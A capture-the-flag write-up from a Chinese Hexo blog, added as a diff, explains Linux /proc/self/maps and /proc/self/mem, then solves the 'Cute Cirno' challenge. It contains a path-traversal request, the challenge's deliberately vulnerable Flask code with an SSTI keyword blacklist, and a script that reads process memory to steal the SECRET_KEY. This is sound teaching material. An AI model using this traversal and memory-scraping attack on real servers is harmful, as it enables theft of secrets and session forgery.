@@ -1,0 +1,823 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="leekos">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="&#x2F;proc&#x2F;self&#x2F;maps &amp;&amp; &#x2F;proc&#x2F;self&#x2F;mem概述： 在Linux系统中，**&#x2F;proc&#x2F;self&#x2F;maps是一个特殊文件，它提供了当前进程的内存映射信息。** 在Linux中，&#x2F;proc是一个虚拟文件系统，提供了访问系统内核和进程信息的接口。&#x2F;proc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="proc目录self下的maps&amp;&amp;mem">
+<meta property="og:url" content="https://leekosss.github.io/2023/08/24/proc%E7%9B%AE%E5%BD%95self%E4%B8%8B%E7%9A%84maps&&mem/index.html">
+<meta property="og:site_name" content="Tranquility">
+<meta property="og:description" content="&#x2F;proc&#x2F;self&#x2F;maps &amp;&amp; &#x2F;proc&#x2F;self&#x2F;mem概述： 在Linux系统中，**&#x2F;proc&#x2F;self&#x2F;maps是一个特殊文件，它提供了当前进程的内存映射信息。** 在Linux中，&#x2F;proc是一个虚拟文件系统，提供了访问系统内核和进程信息的接口。&#x2F;proc">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/05/25/QvDOrbZW98y2Lx1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202305250159353.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202305250204341.png">
+<meta property="og:image" content="https://s2.loli.net/2023/05/25/HD4cxYlkut65Fd8.png">
+<meta property="og:image" content="https://s2.loli.net/2023/05/25/MoyJRDLIkpwg7ze.png">
+<meta property="og:image" content="https://s2.loli.net/2023/05/25/EZB1Te6imHUgFbu.png">
+<meta property="article:published_time" content="2023-08-24T14:38:04.629Z">
+<meta property="article:modified_time" content="2023-06-05T06:58:40.475Z">
+<meta property="article:author" content="leekos">
+<meta property="article:tag" content="proc目录self下的maps&amp;&amp;mem">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s2.loli.net/2023/05/25/QvDOrbZW98y2Lx1.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>proc目录self下的maps&amp;&amp;mem - Tranquility</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"leekosss.github.io","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Tranquility</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="proc目录self下的maps&amp;&amp;mem"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-24 22:38" pubdate>
+          2023年8月24日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          65 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">proc目录self下的maps&amp;&amp;mem</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2023年6月5日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="proc-self-maps-proc-self-mem"><a href="#proc-self-maps-proc-self-mem" class="headerlink" title="&#x2F;proc&#x2F;self&#x2F;maps &amp;&amp; &#x2F;proc&#x2F;self&#x2F;mem"></a>&#x2F;proc&#x2F;self&#x2F;maps &amp;&amp; &#x2F;proc&#x2F;self&#x2F;mem</h2><h3 id="概述："><a href="#概述：" class="headerlink" title="概述："></a>概述：</h3><blockquote>
+<p>在Linux系统中，**&#x2F;proc&#x2F;self&#x2F;maps<strong>是一个特殊文件，它</strong>提供了当前进程的内存映射信息。**</p>
+<p>在Linux中，&#x2F;proc是一个虚拟文件系统，提供了访问系统内核和进程信息的接口。&#x2F;proc&#x2F;self是一个符号链接，指向当前正在执行的进程的目录。因此，**&#x2F;proc&#x2F;self&#x2F;maps实际上指向了当前进程的内存映射信息。**</p>
+<p>该文件包含了当前进程的内存映射区域的详细信息，包括<strong>起始地址、结束地址、访问权限、偏移量、设备号、文件路径</strong>等。每一行对应于一个内存映射区域，</p>
+<p><img src="https://s2.loli.net/2023/05/25/QvDOrbZW98y2Lx1.png" srcset="/img/loading.gif" lazyload alt="image-20230525021902703"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">55bac9dcb000</span>-<span class="hljs-number">55</span>bac9dcd000 r--p <span class="hljs-number">00000000</span> <span class="hljs-number">08</span>:<span class="hljs-number">01</span> <span class="hljs-number">533672</span>                     /usr/bin/cat <br></code></pre></td></tr></table></figure>
+
+<p>代表什么意思</p>
+<ul>
+<li><code>55bac9dcb000-55bac9dcd000</code>: 这是内存区域的起始地址和结束地址。该区域从0x55bac9dcb000到0x55bac9dcd000。</li>
+<li><code>r--p</code>: 这表示内存区域的访问权限。在这种情况下，该区域只允许读取（read）操作。</li>
+<li><code>00000000</code>: 这是该内存区域在文件中的偏移量。在这种情况下，偏移量为0。</li>
+<li><code>08:01</code>: 这是指与该内存区域相关联的设备号和节点号。设备号为08，节点号为01。</li>
+<li><code>/usr/bin/cat</code>: 这是映射到该内存区域的文件的路径。在这种情况下，该区域是由<code>/usr/bin/cat</code>文件映射而来。</li>
+</ul>
+<p>综上所述，该行表示了一个只读权限的内存区域，它是由<code>/usr/bin/cat</code>文件映射而来。</p>
+</blockquote>
+<p>根据上面的描述， <code>/proc/self/maps</code>记录了当前进程的内存映射的相关信息，根据这些信息我们可以找到对应的内存空间</p>
+<blockquote>
+<p>在Linux系统中，**&#x2F;proc&#x2F;self&#x2F;mem<strong>是一个特殊文件，它提供了</strong>对当前进程内存的直接访问。**</p>
+<p>在Linux中，&#x2F;proc是一个虚拟文件系统，提供了访问系统内核和进程信息的接口。&#x2F;proc&#x2F;self是一个符号链接，指向当前正在执行的进程的目录。因此，&#x2F;proc&#x2F;self&#x2F;mem实际上指向了当前进程的内存。</p>
+<p>通过读取和写入&#x2F;proc&#x2F;self&#x2F;mem文件，可以直接对当前进程的内存进行操作。这包括读取和修改进程的内存内容，可以用于调试、分析或修改进程的运行时状态。</p>
+<p>但是需要注意的是，&#x2F;proc&#x2F;self&#x2F;mem文件的访问权限通常非常受限制。只有具有足够权限的用户或特权进程才能访问该文件。此外，对于一个普通的应用程序来说，直接读取或写入&#x2F;proc&#x2F;self&#x2F;mem文件通常是不必要且危险的操作。</p>
+</blockquote>
+<p>我们也知道了 <code>/proc/self/mem</code> 文件 ，可以对当前进程内存进行访问。</p>
+<p>总结一下，就是根据 <code>/proc/self/maps</code>提供的内存地址映射信息找到 <code>/proc/self/mem</code>相应的内存块</p>
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="Cute-Cirno-Cute-Cirno-Revenge"><a href="#Cute-Cirno-Cute-Cirno-Revenge" class="headerlink" title="Cute Cirno &amp; Cute Cirno (Revenge)"></a>Cute Cirno &amp; Cute Cirno (Revenge)</h4><h5 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h5><p>首先查看源码：</p>
+<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305250159353.png" srcset="/img/loading.gif" lazyload alt="image-20230525015929206" style="zoom:33%;" />
+
+<p>发现一个读文件的路由，根据数据包可知，这是python编写的</p>
+<blockquote>
+<p>在Linux系统中，**&#x2F;proc&#x2F;self&#x2F;cmdline<strong>是一个特殊的文件，它</strong>提供了当前进程的命令行参数信息。**</p>
+<p>在Linux中，&#x2F;proc是一个虚拟文件系统，提供了访问系统内核和进程信息的接口。**&#x2F;proc&#x2F;self是一个符号链接，它指向当前正在执行的进程的目录<strong>。因此，</strong>&#x2F;proc&#x2F;self&#x2F;cmdline实际上指向了当前进程的命令行参数信息。**</p>
+</blockquote>
+<p>我们读取 <code>/proc/self/cmdline</code> 获取命令行信息：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>neepusec.fun:<span class="hljs-number">28912</span><span class="hljs-regexp">/r3aDF1le?filename=../</span>..<span class="hljs-regexp">/../</span>proc<span class="hljs-regexp">/self/</span>cmdline<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305250204341.png" srcset="/img/loading.gif" lazyload alt="image-20230525020423295"></p>
+<p>返回了一个文件路径，有一个<code>CuteCirno.py</code>文件</p>
+<p>当我们访问一个不存在的路径时</p>
+<p><img src="https://s2.loli.net/2023/05/25/HD4cxYlkut65Fd8.png" srcset="/img/loading.gif" lazyload alt="image-20230525020627713"></p>
+<p>我们发现报错了，于是读取这两个文件：</p>
+<p>CuteCirno.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, session, render_template, render_template_string<br><span class="hljs-keyword">import</span> os, base64<br><span class="hljs-keyword">from</span> NeepuFile <span class="hljs-keyword">import</span> neepu_files<br><br>CuteCirno = Flask(__name__,<br>                  static_url_path=<span class="hljs-string">&#x27;/static&#x27;</span>,<br>                  static_folder=<span class="hljs-string">&#x27;static&#x27;</span><br>                  )<br><br>CuteCirno.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(base64.b64encode(os.urandom(<span class="hljs-number">30</span>)).decode()) + <span class="hljs-string">&quot;*NeepuCTF*&quot;</span><br><br><br><span class="hljs-meta">@CuteCirno.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">welcome</span>():<br>    session[<span class="hljs-string">&#x27;admin&#x27;</span>] = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;welcome.html&#x27;</span>)<br><br><br><span class="hljs-meta">@CuteCirno.route(<span class="hljs-params"><span class="hljs-string">&#x27;/Cirno&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;CleverCirno.html&#x27;</span>)<br><br><br><span class="hljs-meta">@CuteCirno.route(<span class="hljs-params"><span class="hljs-string">&#x27;/r3aDF1le&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">file_read</span>():<br>    filename = <span class="hljs-string">&quot;static/text/&quot;</span> + request.args.get(<span class="hljs-string">&#x27;filename&#x27;</span>, <span class="hljs-string">&#x27;comment.txt&#x27;</span>)<br>    start = request.args.get(<span class="hljs-string">&#x27;start&#x27;</span>, <span class="hljs-string">&quot;0&quot;</span>)<br>    end = request.args.get(<span class="hljs-string">&#x27;end&#x27;</span>, <span class="hljs-string">&quot;0&quot;</span>)<br>    <span class="hljs-keyword">return</span> neepu_files(filename, start, end)<br><br><br><span class="hljs-meta">@CuteCirno.route(<span class="hljs-params"><span class="hljs-string">&#x27;/genius&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate</span>():<br>    <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;admin&#x27;</span>) == <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(session.get(<span class="hljs-string">&#x27;admin&#x27;</span>))<br>        answer = request.args.get(<span class="hljs-string">&#x27;answer&#x27;</span>)<br>        <span class="hljs-keyword">if</span> answer <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            blacklist = [<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>,<br>                         <span class="hljs-string">&#x27;posix&#x27;</span>, <span class="hljs-string">&#x27;builtins&#x27;</span>, <span class="hljs-string">&#x27;namespace&#x27;</span>,<span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;read&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>, <span class="hljs-string">&#x27;mro&#x27;</span>, <span class="hljs-string">&#x27;base&#x27;</span>,<br>                         <span class="hljs-string">&#x27;global&#x27;</span>, <span class="hljs-string">&#x27;init&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-string">&#x27;00&#x27;</span>, <span class="hljs-string">&#x27;chr&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>, <span class="hljs-string">&#x27;get&#x27;</span>, <span class="hljs-string">&quot;url&quot;</span>, <span class="hljs-string">&#x27;pop&#x27;</span>, <span class="hljs-string">&#x27;import&#x27;</span>,<br>                         <span class="hljs-string">&#x27;include&#x27;</span>,<span class="hljs-string">&#x27;request&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#125;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;config&#x27;</span>,<span class="hljs-string">&#x27;=&#x27;</span>]<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> blacklist:<br>                <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> answer:<br>                    answer = <span class="hljs-string">&quot;⑨&quot;</span> +<span class="hljs-string">&quot;&quot;&quot;&lt;/br&gt;&lt;img src=&quot;static/woshibaka.jpg&quot; width=&quot;300&quot; height=&quot;300&quot; alt=&quot;Cirno&quot;&gt;&quot;&quot;&quot;</span><br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> answer == <span class="hljs-string">&#x27;&#x27;</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;你能告诉聪明的⑨, 1+1的answer吗&quot;</span><br>            <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&quot;1+1=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(answer))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;mathclass.html&#x27;</span>)<br><br>    <span class="hljs-keyword">else</span>:<br>        session[<span class="hljs-string">&#x27;admin&#x27;</span>] = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;你真的是我的马斯塔吗？&quot;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    CuteCirno.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">5000</span>, debug=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure>
+
+<p>观察一下这个文件，发现 <code>SECRET_KEY</code> 是使用随机数生成的</p>
+<p><code>/genius</code>路由会检查session，所以这一题需要我们伪造session，然后绕过过滤进行ssti</p>
+<p>NeepuFile.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">neepu_files</span>(<span class="hljs-params">filename, start=<span class="hljs-number">0</span>, end=<span class="hljs-number">0</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    data = <span class="hljs-string">b&#x27;&#x27;</span><br><br>    <span class="hljs-keyword">try</span>:<br>        start = <span class="hljs-built_in">int</span>(start)<br>        end = <span class="hljs-built_in">int</span>(end)<br><br>    <span class="hljs-keyword">except</span>:<br>        start = <span class="hljs-number">0</span><br>        end = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">if</span> filename != <span class="hljs-string">&quot;&quot;</span> <span class="hljs-keyword">and</span> os.access(filename, os.R_OK):<br>        f = <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&quot;rb&quot;</span>)<br><br>        <span class="hljs-keyword">if</span> start &gt;= <span class="hljs-number">0</span>:<br>            f.seek(start) <span class="hljs-comment"># 将文件指针移动到start位置</span><br>            <span class="hljs-keyword">if</span> end &gt;= start <span class="hljs-keyword">and</span> end != <span class="hljs-number">0</span>:<br>                data = f.read(end - start)<br><br>            <span class="hljs-keyword">else</span>:<br>                data = f.read()<br><br>        <span class="hljs-keyword">else</span>:<br>            data = f.read()<br><br>        f.close()<br><br>    <span class="hljs-keyword">else</span>:<br>        data = (<span class="hljs-string">&quot;File `%s` not exist or can not be read&quot;</span> % filename).encode()<br><br>    <span class="hljs-keyword">return</span> data<br></code></pre></td></tr></table></figure>
+
+<p>该文件是用来读取文件内容的，并且可以指定读取的起始地址</p>
+<p>然后我们需要思考突破点，我们怎样才能得到key呢，这个是随机产生的，我们不可能猜出来。</p>
+<p>由于我们不知道key，但是由于程序在运行时，会将部分信息存入内存中，所以我们只需要找到内存中带有： <code>*NeepuCTF*</code> 字样的字符串取出来就是<code>SECRET_KEY</code>了</p>
+<p>我们编写脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf-8 -*-</span><br><span class="hljs-comment"># @Time : 2023/5/24 23:32</span><br><span class="hljs-comment"># @Author : Leekos</span><br><span class="hljs-comment"># @File : cute.py</span><br><span class="hljs-comment"># @Software : PyCharm</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>url = <span class="hljs-string">&quot;http://neepusec.fun:28912/r3aDF1le?filename=../../../&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">maps</span>():<br><br>    req = requests.get(url=url + <span class="hljs-string">&quot;/proc/self/maps&quot;</span>)<br>    text = req.text<br>    ls = text.split(<span class="hljs-string">&quot;\n&quot;</span>)<br>    pattern = <span class="hljs-string">&quot;([0-9a-z]+)-([0-9a-z]+) rw&quot;</span><br>    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> ls:<br>        map_addr = re.<span class="hljs-keyword">match</span>(pattern,l) <br>        <span class="hljs-keyword">if</span> map_addr:<br>            <span class="hljs-comment"># print(map_addr.group(1),&quot;-&quot;,map_addr.group(2))</span><br>            start = <span class="hljs-built_in">int</span>(map_addr.group(<span class="hljs-number">1</span>), <span class="hljs-number">16</span>) <span class="hljs-comment">#group(1)会得到匹配到的字符串的第1个值，模式串中第1个大括号匹配到的</span><br>            end = <span class="hljs-built_in">int</span>(map_addr.group(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>)<br>            mem_url = url + <span class="hljs-string">&quot;/proc/self/mem&amp;start=&quot;</span>+<span class="hljs-built_in">str</span>(start)+<span class="hljs-string">&quot;&amp;end=&quot;</span>+<span class="hljs-built_in">str</span>(end)<br>            requ = requests.get(url=mem_url)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;*NeepuCTF*&quot;</span> <span class="hljs-keyword">in</span> requ.text:<br>                mem_pattern = <span class="hljs-string">b&quot;[A-Za-z0-9+/=]&#123;40&#125;\*NeepuCTF\*&quot;</span><br>                key = re.findall(mem_pattern, requ.content) <span class="hljs-comment"># 内存有很多不可打印字符，所以使用字节形式</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Secret Key: &quot;</span> + <span class="hljs-built_in">bytes</span>.decode(key[<span class="hljs-number">0</span>])) <span class="hljs-comment"># 将字节解码为字符串</span><br>                <span class="hljs-keyword">break</span><br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    maps()<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>解释一下这个脚本的意思：</p>
+<p>首先获得maps文件的值，然后分隔成列表，进行遍历。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">pattern = <span class="hljs-string">&quot;([0-9a-z]+)-([0-9a-z]+) rw&quot;</span><br><span class="hljs-comment"># 匹配maps中有读写权限rw的字符串</span><br></code></pre></td></tr></table></figure>
+
+<p>当匹配到时，if条件为真，将group(1)、group(2)分别转为10进制（代表内存的首末地址）</p>
+<p>然后根据地址读取mem文件的值，如果内存中包含指定字符串就打印出key</p>
+</blockquote>
